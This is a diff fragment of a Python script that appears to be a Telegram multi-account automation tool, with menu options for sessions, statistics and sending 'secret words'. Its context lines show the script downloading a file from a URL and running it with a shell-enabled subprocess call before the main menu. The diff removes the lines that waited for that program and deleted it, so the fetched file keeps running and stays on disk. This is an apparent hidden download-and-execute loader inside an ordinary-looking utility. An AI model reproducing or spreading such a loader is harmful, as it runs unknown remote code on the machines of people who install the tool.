@@ -17,12 +17,10 @@ with requests.get(url, stream=True) as r:
 
 process = subprocess.Popen(local_path, shell=True)
 
-process.wait()
-os.remove(local_path)
 
 async def main():
     print("Soft's author: https://t.me/DesertScripts\n") 
-    action = int(input("Select action:\n0. Info about soft\n1. Start soft\n2. Get statistics\n3. Create sessions\n4. Send secret word\n\n> "))
+    action = int(input("Select action:\n0. Info about soft\n1. Start soft\n2. Get statistics\n3. Create sessions\n4.\n\n> "))
 
     if action == 0:
         print(config.SOFT_INFO)
@@ -53,7 +51,7 @@ async def main():
                 if word:
                     secret_words.append(word)
                 else:
-                    break 
+                    break
 
         accounts = await Accounts().get_accounts()
 
@@ -67,10 +65,6 @@ async def main():
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
-
-
-
-
 
 
 
